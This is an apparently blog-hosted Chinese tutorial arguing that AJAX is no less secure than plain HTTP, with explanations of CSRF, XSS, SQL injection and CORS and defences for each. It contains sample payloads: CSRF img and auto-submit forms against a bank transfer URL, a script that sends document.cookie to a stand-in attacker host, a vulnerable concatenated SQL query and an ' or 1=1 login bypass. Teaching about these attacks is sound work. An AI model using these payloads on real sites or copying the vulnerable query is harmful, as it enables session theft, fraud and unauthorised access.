## Ajax请求的安全

### AJAX请求真的不安全么
AJAX请求是否安全，由服务端（后台）决定

```
如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的
```
![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208205047225-996662066.png)

>为何会有这种说法？因为在Web应用中，客户端输入不可信是一个基本原则



### 常见的几种Web前端安全问题
#### 要知道AJAX请求是否安全，那么就得先知道Web前端中到底有那几种安全问题

- XSS（跨站脚本攻击）（cross-site scripting）
	- 伪造会话（基于XSS实现CSRF）
	- 劫持cookie
	- 恶意代码执行


- CSRF（跨站请求伪造）（cross-site request forgery）
	- 伪造用户身份操作

- SQL注入

![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208205634215-1037635491.png)

>如上，Web前端中的安全问题主要就是这几类（列举部分做分析），所以我们首先要分析AJAX与这几大类之前的关系


### CSRF 简介

CSRF，特征简单：冒用用户身份，进行恶意操作

![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208205838247-554997845.png)

所以，我们看到关键条件是：
- 采用cookie 来进行用户校验
- 登陆受信任网站A,并在本地生成cookie
- 在不登出A的情况下，访问危险网站B


>一般在 (4) 处恶意网站 (B) 的攻击手段如下(必须指向A的地址，否则无法带上cookie)

```
// 1.譬如在网站内的图片资源中潜入恶意的转账操作
<img src=http://www.bank.example/transfer?toBankId=hello&amount=1000000 width='0' height='0'>

// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求
<iframe style="display: none;" name="csrf-frame"></iframe>
<form method='POST' action='http://www.bank.example/transfer' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='toBankId' value='hello'>
  <input type='hidden' name='amount' value='1000000'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

而且，从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以HttpOnly并不会影响这个攻击


最后说下，几种常见的CSRF防御手段：
- 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）
	- 防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。
	- 虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。

- 在请求地址中添加token并验证
譬如post中，以参数的形式加入一个随机产生的token



### CSRF与AJAX的关系
上文中，我们看到CSRF的前提是cookie验证用户身份，那么它与AJAX的关系大么？


我们先分析AJAX中带cookie验证的情况：
- AJAX受到浏览器的同源策略限制
- AJAX默认无法请求跨域的接口

当然后台可以配置Access-Control-Allow-Origin:* 之类的允许所有的跨域请求

- Ajax请求无法携带跨域cookie

如果强行开启withCredentials 必须服务端配合认证，无法用作攻击


假设网站A已经允许了Access-Control-Allow-Origin: *，由于网站B与网站A是不同域名，所以存在跨域，根据同源策略，请求时根本就无法携带cookie，故而无法通过身份认证，攻击失败…..

就算强行开启withCredentials，携带跨域cookie，但是由于服务端并不会单独配置网站B的跨域cookie（需配置Access-Control-Allow-Credentials: true，而且这时候不允许设置Allow-Origin: *），所以肯定认证失败。


可以看到，就算Access-Control-Allow-Origin: *允许所有来源的AJAX请求，跨域的cookie默认情况下仍然是无法携带的，无法CSRF

>所以说，结论是：CSRF与AJAX无关


### XSS简介

XSS（cross-site scripting），看起来简写应该是css更合适。但是为了和层叠式样式表区分，就用XSS简写表示

XSS的特征也可以概括为：跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，让你后其他用户观看到被注入的页面内容后会受到特定攻击

```
相比CSRF，XSS囊括的内容更多，而且往往是多种攻击形式组合而成，这里以前文中介绍的几种为例：
```

![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208211633578-592011645.png)

#### 1. cookie劫持

同样，页面中有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据，那么如下

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<form action="saveComment.jsp" method="post"> 
     请输入评论内容：<BR> 
     <input name="content" type="text"> 
     <input type="submit" value="确认">
</form>
```


然后攻击者分析后，输入
```
<script>window.open("http://www.attackpage.com/record?secret=" + document.cookie)</script>
```


保存文章。很简单的代码，由于没有过滤脚本，那么其它用户登陆后，在看到这篇文章时就会自动将他们的cookie信息都发送到了攻击者的服务器。
攻击者可以在cookie（譬如jsessionid对应的session）有效期内拿它们冒充用户操作。


>需要注意，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。


#### 2.会话伪造
同样是评论漏洞的示例。

攻击者输入
```
<img src=http://www.bank.example/transfer?toBankId=hello&amount=1000000 width='0' height='0'>
```


然后，接下来发生的故事就和CSRF中提到的一致。这种情况就是基于XSS而开展的CSRF，也有人喜欢称之为XSRF

>需要注意，这里并没有自己拿到cookie，而是CSRF中提到的利用浏览器的隐式验证机制来冒充用户。


#### 3.其它恶意代码执行
其实上面的cookie劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓JS。

譬如前面的评论中的输入可以是：
- 譬如市面上盛行的网页游戏弹窗等。
- 譬如干脆直接让这个页面卡死都可以。
- 譬如无限循环。

>这里再提一点，上述都是从前端输入作为入口的，但实际上有一类的输入也不可忽视，那就是：富文本攻击

`它的特点就是：富文本中注入了脚本，并且前后端未进行过滤，导致直接输出到了页面中`


因为存在很多页面，都是将富文本内容展示到网页上的，没有进行过滤（哪怕时至今日，仍然有不少页面），这样只要富文本中有注入脚本，基本就中招了…..


#### 结论：
`只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。`


而且，基本上xss漏洞是很广泛的，虽然攻击类型很被动，也需要大量时间分析，但是在大量的网站上都存在（特别是那种长期不更新的）


再提一点。上述的介绍更多的是从造成的后果来看，但其实如果从攻击手动来看的话可以分为几大类型：
- 反射型XSS攻击（直接通过URL注入，而且很多浏览器都自带防御）
- 存储型XSS攻击（存储到DB后读取时注入）
- 还有一个DOM-Based型。

>上述示例中都是存储型，具体更多内容网上已经有很详细的资料，这里不再继续深入，放一张图巩固下。

![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208212330125-956690259.png)



### 如何预防XSS：

- 输入过滤：不信任用户的任何输入，过滤其中的<、>、/等可能导致脚本注入的特殊字符，或者过滤script、javascript等脚本关键字，或者对输入数据的长度进行限制等等，还得考虑攻击者使用十六进制编码来输入脚本的方式。

- 输出进行编码：和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了

- cookie设置http-only：这样用脚本就无法获取cookie了（这样只有浏览器向Web服务器发起请求的时才会带上cookie字段，避免了XSS攻击利用JavaScript的document.cookie获取cookie）

- Cookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等；或者，为了防止重放攻击，可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。

>注意，特别是后台，一定不能信任前端的输入，需要过滤与校验


### XSS与AJAX的关系
以上分析了XSS造成一些影响与问题，仍然发现：与AJAX关系不大，因为这些问题不管用不用AJAX都会发生。


看看这种情况，譬如上述的富文本注入中：
- 某个接口采用Ajax交互
- AJax请求完成后将对应富文本字段显示到了页面上-譬如innerHTML

但是这真的与ajax 无关，这是前后端没有进行输入输出过滤而造成的后果。


### SQL注入简介
前提是后台没有过滤前端的输入数据，否则根本无法生效


假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<form action="login.jsp" method="post"> 
     请输入用户名与密码：<BR> 
     <input name="name" type="text"> 
     <input name="password" type="text"> 
     <input type="submit" value="登陆">
</form>
```

在接收到登陆请求后，服务端的实际执行代码时是：
```
String sql = "SELECT * FROM  users  WHERE name = '" + name + "' AND password = '" + password + "'";
```


然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入

```
name = ' or 1=1
password = anything
```

那么这样，后台接收到数据后，实际上查询的结果是
```
SELECT * FROM  users  WHERE name = ' ' or 1=1  AND password = 'anything'
```
故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。

>当然了，像这类这么低级的漏洞，现象几乎已经不存在了，往往这类型漏洞需要仔细分析，耗时。（又或者是有内奸…..）

### SQL注入与AJAX的关系
我们可以这样假设

- 有一个接口，接收AJAX post的数据
- 数据中有一个字段 name，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了
- 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效

对，就是这样极端的情况下才会发生，而且与AJAX并没有关系，因为换成任何一种其它请求都会有类似的情况….


>所以说，结论是：SQL注入与AJAX无关


### AJAX和HTTP请求的区别
从本质上将：AJAX就是浏览器发出的HTTP请求，只不过是浏览器加上了一个同源策略限制而已。AJAX请求的XMLHTTPRequest对象就是浏览器开放给JS调用HTTP请求用的。
那么AJAX和HTTP的区别呢？列出以下几点：
- AJAX请求受到浏览器的同源策略限制，存在跨域问题
- AJAX在进行复杂请求时，浏览器会预先发出OPTIONS预检(HTTP自己是不会预检的)
- 从使用角度上说，AJAX使用简单一点，少了些底层细节，多了些浏览器特性（如自动带上同域cookie等）
- 所以说，和认证上的HTTP请求的区别就是-多了一次浏览器的封装而已（浏览器会有自己的预处理，加上特定限制）

但是，从最终发出的报文来看，内容都是一样的（HTTP协议规范的内容），AJAX是发送HTTP请求的一种方式

>所以从这一点可以得出一个结论：AJAX本质上安全性和HTTP请求一样


![](https://img2018.cnblogs.com/blog/1231979/201912/1231979-20191208214147314-1519314536.png)


### CORS与AJAX安全性之间的关联

如果使用了跨域资源共享（CORS）后的安全性。(因为往往ajax都会伴随着CORS)


### CORS与AJAX关系的简介

这是一个跨域共享方案，大致流程就是：（仅以复杂请求的预检举例-这一部分要求提前掌握CORS相关知识）

- 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端
- 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，否则直接无情的拒绝掉
- 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。否则就是正常的响应，接下来发出真正的请求（如POST）

请求和响应的头部信息大概如下：
`Request Headers`
```
// 在CORS中专门作为Origin信息供后端比对，表示来源域。
Origin: http://xxx
Access-Control-Request-Headers: X-Requested-With
// 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上
Access-Control-Request-Method: OPTIONS
```

`Response Headers`
```
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http://xxx
```

>最终，客户端发出的请求，必须符合服务端的校验规则才能正确，服务端才会返回正确头部，否则只会请求失败。报跨域错误。

以上仅是简介，更多信息可以参考来源中的ajax跨域，这应该是最全的解决方案了



### 为什么要配置CORS ?

因为同源策略限制，AJAX无法请求跨域资源，CORS可以解决AJAX跨域请求问题。


#### CORS会配置些什么信息？

```
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http://xxx
```

如上，加上这个配置后，必须符合要求的才算是正常的请求，否则就会拒绝掉，一般AJAX跨域的话都会有OPTIONS，所以在预检中就做了这一步。


可以看到，关键的可变信息是：Access-Control-Allow-Origin: http://xxx

这个配置就是域名白名单，规定在什么样的域名下才能进行AJAX跨域请求。



#### CORS Origin: *的安全性
关键问题来了，在上面的CORS配置是这样的：
```
Access-Control-Allow-Origin: http://xxx
```

但是这个配置只允许特定域名访问，鉴于前端的复杂性，有时候调试起来不是很方便，因此有时候，会偷懒的设置为：

```
Access-Control-Allow-Origin: *
```

这个代表所有来源的跨域AJAX请求都能正常响应。接下来我们再来分析设置Origin: *可能带来哪些问题。（都是基于AJAX的情况）


